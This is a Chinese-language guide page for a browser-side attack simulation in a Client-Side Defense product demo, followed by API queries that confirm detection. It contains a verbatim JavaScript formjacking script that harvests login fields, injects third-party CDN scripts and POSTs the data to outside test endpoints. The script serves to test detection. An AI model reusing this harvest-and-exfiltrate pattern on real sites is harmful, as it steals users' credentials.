第二階段針對受保護的應用程式產生模擬攻擊流量，並確認 CSD 已偵測到該流量。在繼續之前，第一階段必須完成 — 所有步驟 7 的檢查均為 PASS。

## 步驟 8：攻擊模擬

<Aside type="note">
此步驟需要瀏覽器端的 JavaScript 執行 — `curl` 無法觸發 CSD 偵測。具有瀏覽器自動化工具（MCP Chrome DevTools、Playwright、Puppeteer）的 AI 助手可使用下方的 **AI 自動化執行**序列直接執行這些步驟。沒有瀏覽器自動化功能的操作人員請執行手動步驟。
</Aside>

在基礎設施驗證完成（所有第一階段步驟 7 檢查均為 PASS）後，執行攻擊模擬腳本以產生 CSD 偵測。這些腳本定義於[觸發偵測](/csd/trigger-detection/)指南和[攻擊腳本庫](/csd/attack-scripts/)中。

### AI 自動化執行

具有瀏覽器自動化工具的 AI 助手以程式化方式執行攻擊模擬：

1. **使用 initScript 導航** — 首先導航至 `about:blank` 以確保乾淨的文件上下文（避免先前導航殘留的 initScript），然後使用 `navigate_page` 導航至 `http://$F5XC_DOMAINNAME/#/login`，並附帶一個 `initScript`，該腳本在 zone.js 修補之前保存原生的 `setInterval`、`clearInterval`、`fetch` 和 `console.log`，輪詢登入表單欄位，透過原生 `HTMLInputElement.prototype.value` setter 填入憑證，並立即內聯執行組合偵測腳本。請使用下方的逐字 initScript。
2. **關閉歡迎橫幅** — 使用 `press_key` 按下 `Escape` 關閉歡迎橫幅。在後續訪問中，橫幅可能不會出現（cookies 已持久化）。Cookie 同意對話框也會被 Escape 鍵自動關閉。
3. **等待完成** — 等待 10 秒，讓所有 CDN 腳本載入/錯誤回呼和 fetch promise 解析完成。
4. **擷取證據** — 使用 `list_console_messages` 檢查 `[CSD Demo] Simulation complete` 和 CDN 載入結果；使用 `list_network_requests` 過濾 `script` 和 `fetch` 類型以驗證 HTTP 狀態碼（`200`/`201` 表示成功，`pending` 表示被暫停的請求）。

**第二階段 initScript（逐字使用 — 請完全按照原樣使用）：**

```javascript
// Save native references before zone.js patches them
var _si = window.setInterval.bind(window);
var _ci = window.clearInterval.bind(window);
var _fetch = window.fetch.bind(window);
var _log = window.console.log.bind(window.console);

// Poll for login form fields, fill credentials, run detection script
var _poll = _si(function() {
  var emailEl = document.querySelector('#email');
  var passEl  = document.querySelector('#password');
  if (emailEl && passEl) {
    _ci(_poll);
    // Fill credentials via native setter (bypasses zone.js)
    var nativeSet = Object.getOwnPropertyDescriptor(
      window.HTMLInputElement.prototype, 'value').set;
    nativeSet.call(emailEl, 'test@example.com');
    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
    nativeSet.call(passEl, 'P@ssword123');
    passEl.dispatchEvent(new Event('input', { bubbles: true }));

    // Run Combined Detection Script inline using native fetch for exfil
    (function() {
      _log('==================================================');
      _log('[CSD Demo] Combined Detection Script — Starting');
      _log('==================================================');

      _log('\n[Formjack] Phase 1: Form field harvesting');
      var inputs = document.querySelectorAll('input');
      var harvested = {};
      inputs.forEach(function(input) {
        var name = input.name || input.id || input.type;
        harvested[name] = input.value || '(empty)';
      });
      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);

      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
      var cdns = [
        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
      ];
      cdns.forEach(function(cdn) {
        var script = document.createElement('script');
        script.src = cdn.url;
        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
        document.head.appendChild(script);
        _log('[Supply Chain] Injected script tag: ' + cdn.name);
      });

      _log('\n[Exfil] Phase 3: Data exfiltration');
      var payload = JSON.stringify({
        type: 'combined_demo', credentials: harvested,
        page: window.location.href, timestamp: Date.now()
      });
      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
      _fetch('https://jsonplaceholder.typicode.com/posts', {
        method: 'POST', mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' }, body: payload
      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });

      _log('\n==================================================');
      _log('[CSD Demo] Simulation complete');
      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
      _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
      _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
      _log('==================================================');
    })();
  }
}, 300);
```

<Aside type="caution">
**zone.js 不相容性** — Juice Shop 使用 Angular 的 zone.js，它會修補 `setTimeout`、`setInterval`、`fetch`、`XMLHttpRequest` 和其他瀏覽器 API。這會導致 MCP 的 `evaluate_script`、`fill` 和 `click` 工具出現 `Cannot read properties of undefined (reading 'call')` 錯誤。請改用帶有 `initScript` 的 `navigate_page` — `initScript` 在 zone.js 載入之前執行，因此您可以保存原生 API 參考並在輪詢回呼中使用它們。initScript 必須使用原生 `HTMLInputElement.prototype.value` setter（而非 `fill`）填入表單欄位，並內聯執行偵測腳本（而非透過 `setTimeout`，zone.js 可能在頁面載入後攔截）。詳情請參閱[觸發偵測 — AI 自動化執行](/csd/trigger-detection/#ai-automated-execution)。
</Aside>

<Aside type="note">
**initScript 累積** — 每次帶有 `initScript` 參數的 `navigate_page` 呼叫都會將腳本新增至持久化列表，在每次後續文件載入時執行。為避免過時腳本產生干擾，請在執行之間導航至 `about:blank`，或使用帶有 `isolatedContext` 的 `new_page` 以獲得乾淨的瀏覽器上下文。
</Aside>

<Aside type="note">
**在 initScript 中保存原生 `fetch`** — initScript 在 zone.js 修補之前保存 `window.fetch.bind(window)`。這確保 fetch 呼叫可以正確運作，不會出現 zone.js 的 `Cannot read properties of undefined` 錯誤。相同的 initScript（已保存原生 `fetch`）同時用於第二階段和第三階段的攻擊執行 — CSD 緩解措施不會攔截 `fetch()` 呼叫，因此保存原生參考不會影響緩解行為。
</Aside>

<Aside type="caution">
**暫時性來源 404** — 首次導航至 Angular 應用程式時，`polyfills.js` 或其他應用程式腳本可能從來源伺服器返回暫時性 HTTP 404。這會導致 Angular 無法啟動，產生沒有登入表單的空白頁面。404 是暫時性的 — 後續請求會返回 200 或 304。**恢復方法：**導航至 `about:blank`，等待 2 秒，然後重試導航。如果問題在多次重試後仍然存在，請透過負載平衡器路徑檢查來源健康狀態（`curl -s -o /dev/null -w '%{http_code}' http://$F5XC_DOMAINNAME/polyfills.js`）。
</Aside>

### 手動執行

沒有瀏覽器自動化工具的操作人員請手動執行以下步驟：

1. **導航**至受保護應用程式的登入頁面：`http://xF5XC_DOMAINNAMEx/#/login`
2. **輸入虛擬憑證** — 在 Email 欄位中輸入 `test@example.com`，在 Password 欄位中輸入 `P@ssword123`（不要提交表單）
3. **開啟 DevTools** — 按 **F12** 並切換至 **Console** 標籤
4. **執行組合偵測腳本** — 將[觸發偵測 &mdash; 執行組合模擬腳本](/csd/trigger-detection/#run-the-combined-simulation-script)中的腳本貼到主控台並按 Enter
5. **驗證主控台輸出** — 確認 `[CSD Demo]` 分階段輸出顯示：欄位擷取、從 4 個 CDN 網域注入腳本，以及向 2 個端點進行資料外洩

### 觸發的內容

| 信號 | 行為 | 偵測 |
| --- | --- | --- |
| 表單欄位擷取 | 讀取 email 和 password 輸入值 | 讀取敏感表單欄位的腳本 — 標記為高風險 |
| 腳本注入 | 從 `cdn.jsdelivr.net`、`esm.sh`、`unpkg.com`、`ga.jspm.io` 注入 4 個 `&lt;script&gt;` 標籤 | 偵測到最多 4 個新的第三方腳本網域（CDN 可用性可能有所不同） |
| 資料外洩 | 透過 `fetch` 將擷取的資料傳送至 `www.httpbin.org` 和 `jsonplaceholder.typicode.com` | 向外部網域的網路呼叫 |

<Aside type="note">
**CDN 可用性可能有所不同。**並非所有 4 個 CDN 腳本在每次執行中都會載入 — 瀏覽器資源限制、網路狀況或 CDN 節流可能導致部分腳本因 `ERR_INSUFFICIENT_RESOURCES` 或逾時而失敗。只要**任何** CDN 腳本成功載入，模擬即視為成功。無論腳本是否成功載入，CSD 都會偵測到注入嘗試 — `&lt;script&gt;` 標籤的建立本身就是偵測信號。

在嚴重情況下，`ERR_INSUFFICIENT_RESOURCES` 可能升級為頁面級失敗 — 整個頁面變為空白、截圖逾時，且 `take_snapshot` 失敗。這通常發生在同一瀏覽器上下文中累積了多次帶有大量 initScript 的導航之後。**恢復方法：**使用帶有 `isolatedContext` 的 `new_page` 建立全新的瀏覽器上下文，然後從 `about:blank` → 帶有 initScript 的 `navigate_page` 序列重試。這與個別 CDN 腳本失敗不同，後者不影響模擬成功。
</Aside>

<Aside type="tip">
執行攻擊模擬後，使用以下確定性輪詢迴圈等待偵測結果：

1. 每 60 秒查詢一次 `/detected_domains`
2. 如果 DET-3 通過（外洩網域出現在 `/detected_domains` 中），立即進入步驟 9
3. 如果在 10 次查詢（10 分鐘）後仍為空，檢查 CSD 狀態（第一階段步驟 5）和受保護網域註冊（第一階段步驟 6）— 其中之一可能配置錯誤
4. 如果在 30 次查詢（30 分鐘）後仍為空，停止並向操作人員報告 — 不要繼續進入第三階段

如需額外的針對性模擬（個別攻擊類別、最大偵測壓力測試），請參閱[攻擊腳本庫](/csd/attack-scripts/)。
</Aside>

### 證據

AI 助手應報告以下內容。對於 AI 自動化執行，證據透過 `list_console_messages` 以程式化方式擷取（initScript 的輪詢函式將結果記錄到主控台）。對於手動執行，操作人員讀取瀏覽器主控台輸出。

| 檢查 | 預期結果 | 狀態 |
| --- | --- | --- |
| 登入頁面已載入 | `http://$F5XC_DOMAINNAME/#/login` 返回 `200 OK` | PASS / FAIL |
| 主控台腳本已執行 | 主控台輸出中出現 `[CSD Demo] Simulation complete` | PASS / FAIL |
| 欄位已擷取 | 主控台輸出中計數 &gt; 0 | PASS |
| 腳本已注入 | 主控台輸出中出現 1–4 個 CDN 網域（部分可能因資源錯誤而失敗） | 如果出現任何 CDN 網域則為 PASS |
| 外洩通道 | 主控台輸出中出現 2 個 fetch POST 嘗試 | PASS |

<Aside type="tip">
如果 HTTPS LB 憑證有效（`CertificateValid`），您可以選擇性地針對 `https://$F5XC_DOMAINNAME/#/login` 執行模擬。這不是示範進展的必要條件。
</Aside>

## 步驟 9：透過 API 驗證偵測

查詢 CSD API 端點以確認偵測結果已出現。使用輪詢迴圈：每 60 秒查詢 `/detected_domains`；一旦 DET-3 通過即可繼續。如果 DET-3 在 10 分鐘後仍未通過，請檢查 CSD 配置。如果 DET-3 在 30 分鐘後仍未通過，請停止並向操作人員報告。這些端點記錄在 [API 參考](/csd/api-reference/)中，並使用與先前步驟相同的驗證和命名空間。

<Aside type="note">
**端點處理順序：**`/detected_domains` 最先被填入資料，是 CSD 管道正常運作的主要指標。`/scripts` 和 `/formFields` 依據較慢的後端處理排程填入，即使在多次模擬執行後也可能在 20–30 分鐘內保持為空。如果 `/detected_domains` 顯示外洩網域（`www.httpbin.org`、`jsonplaceholder.typicode.com`），則視模擬為已成功偵測並繼續 — 下方的 DET-1 檢查反映了這一點。
</Aside>

### 偵測到的腳本

查詢過去 24 小時內偵測到的腳本：

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s -X POST \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  -H "Content-Type: application/json" \
  -d "{\"startTime\": \"$START\", \"endTime\": \"$NOW\"}" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/scripts" \
  | jq '{total: (.scripts | length), scripts: [.scripts[]? | {script_name: .script_name, risk_level: .risk_level}]}'
```

| 欄位 | 預期結果 | 狀態 |
| --- | --- | --- |
| `total` | &gt; 0（偵測到腳本） | 如果 &gt; 0 則為 PASS；如果為 0 但 `/detected_domains` 顯示外洩網域則為 PENDING |
| 腳本名稱 | `script_name` 中包含 CDN 網域（`cdn.jsdelivr.net`、`esm.sh`、`unpkg.com`、`ga.jspm.io`） | 如果出現注入的 CDN 網域則為 PASS |

### 偵測到的網域

```bash
curl -s \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/detected_domains" \
  | jq '{total_domains: .domain_summary.totalDomains, domains: [.domains_list[]? | {domain: .domain, category: .category}]}'
```

| 欄位 | 預期結果 | 狀態 |
| --- | --- | --- |
| `total_domains` | &gt; 0 | 如果 &gt; 0 則為 PASS |
| 網域列表 | 包含 CDN 和外洩網域 | 如果出現預期的網域則為 PASS |

### 表單欄位

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/formFields?startTime=$START&endTime=$NOW" \
  | jq '{total: .total_size, fields: [.form_fields[]? | {name: .name, sensitivity: .analysis.value, scripts: (.associated_scripts | length), locations: .locations}]}'
```

| 欄位 | 預期結果 | 狀態 |
| --- | --- | --- |
| `total` | &gt; 0 | 如果 &gt; 0 則為 PASS；如果為 0 但 DET-3 通過則為 PENDING |
| `name` | 包含 `email`、`password` | 如果出現敏感欄位則為 PASS |
| `sensitivity` | email/password 欄位為 `Sensitive` | 如果 ML 分類正確則為 PASS |

<Aside type="note">
**表單欄位處理比網域偵測更慢。**`/formFields` 端點在首次查詢時可能返回帶有部分中繼資料的欄位。ML 敏感度分類（`Sensitive` 與 `Not Sensitive`）在後端處理完成後才會填入 — 這可能在首次模擬執行後需要 20–30 分鐘。如果欄位已顯示但缺少分類，請稍後重新查詢。DET-3（`/detected_domains`）是主要通過標準。
</Aside>

### 第二階段證據摘要

完成所有偵測查詢後，呈現最終偵測狀態：

| 測試 ID | 檢查 | 狀態 |
| --- | --- | --- |
| DET-1 | 偵測到腳本（`/scripts` 端點） | 如果 &gt; 0 則為 PASS；如果為空但 DET-3 通過則為 PENDING |
| DET-2 | 偵測到 CDN 網域 | PASS / FAIL |
| DET-3 | 偵測到外洩網域（`/detected_domains`） | **主要指標** — 如果出現 `www.httpbin.org` 或 `jsonplaceholder.typicode.com` 則為 PASS |
| DET-4 | 偵測到表單欄位（`/formFields` 端點） | 如果 &gt; 0 則為 PASS；如果為空但 DET-3 通過則為 PENDING |

<Aside type="note">
**進入第三階段的最低通過標準：**DET-3 必須為 PASS（外洩網域在 `/detected_domains` 中可見）。DET-1 和 DET-4 在首次使用或全新重建後可能顯示 PENDING — 這是正常的。如果 DET-3 在 30 分鐘後也顯示 FAIL，請驗證 CSD 是否已啟用（第一階段步驟 5）、受保護網域是否已註冊（第一階段步驟 6），以及 CSD JS 標籤是否正在被注入（第一階段步驟 7 JS 配置檢查）。
</Aside>
